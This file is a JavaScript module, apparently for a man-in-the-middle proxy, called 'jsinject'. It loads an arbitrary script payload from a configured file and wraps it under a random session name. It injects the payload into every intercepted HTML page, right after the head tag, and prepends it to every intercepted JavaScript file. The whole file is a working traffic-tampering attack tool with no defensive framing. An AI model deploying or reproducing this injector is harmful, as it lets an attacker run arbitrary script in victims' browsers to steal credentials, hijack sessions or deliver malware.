var session_id,
    payload,
    payload_path,
    payload_container = "" + 
    	"if (!self.{{session_id}}) {\n" + 
    		"var {{session_id}} = function() {\n" + 
    			"{{payload}}\n" + 
    		"}\n" + 
    		"{{session_id}}();\n" + 
    	"}\n"

var green = "\033[32m",
    bold  = "\033[1;37m",
    reset = "\033[0m"

function randomString(length) {
	var chars  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
	    buffer = ""
	while (buffer.length < length) {
		index = parseInt( Math.random() * chars.length )
		buffer = buffer + chars.charAt(index)
	}
	return buffer
}

function configure() {
	payload_path = env["jsinject.payload"].replace(/\s/g, "")
	payload = readFile(payload_path)
	payload = payload_container.replace("{{payload}}", payload).replace(/\{\{session_id\}\}/g, session_id)
}

function onLoad() {
	session_id = randomString( 4 + parseInt( Math.random() * 16 ) )
	configure()
	log_info(green + "jsinject" + reset + " started injecting payload " + bold + payload_path + reset + " into HTTP traffic.")
	log_info(green + "jsinject" + reset + " session ID is " + bold + session_id + reset + ".")
}

function onResponse(req, res) {
	configure()
	if ( res.ContentType.match(/^text\/html/i) || req.Path.replace(/\?.*/, "").match(/\.(htm|html)$/i) ) {
		res.ReadBody()
		log_debug("(" + green + "jsinject" + reset + ") attempting to inject HTML document from " + bold + req.Hostname + reset + " ...")
		res.Body = res.Body.replace(/<head>/i, "<head><script>" + payload + "</script>")
	}
	if ( res.ContentType.match(/^text\/javascript/i) || res.ContentType.match(/^application\/javascript/i) || req.Path.replace(/\?.*/, "").match(/\.js$/i) ) {
		res.ReadBody()
		log_debug("(" + green + "jsinject" + reset + ") attempting to inject JS document from " + bold + req.Hostname + reset + " ...")
		res.Body = payload + res.Body
	}
}
